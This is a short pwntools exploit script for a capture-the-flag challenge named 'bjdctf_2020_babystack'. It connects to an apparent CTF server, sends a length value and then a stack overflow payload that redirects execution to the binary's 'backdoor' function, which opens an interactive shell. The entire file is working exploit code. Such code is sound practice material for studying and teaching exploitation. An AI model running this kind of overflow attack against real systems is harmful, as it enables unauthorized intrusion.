from pwn import *

io = remote('node4.buuoj.cn', 25005)
# io = process('bjdctf_2020_babystack')
elf = ELF('bjdctf_2020_babystack')
backdoor = elf.symbols['backdoor']

io.recv()
io.sendline('255')
payload = cyclic(0x18) + p64(backdoor)
io.sendline(payload)
io.interactive()

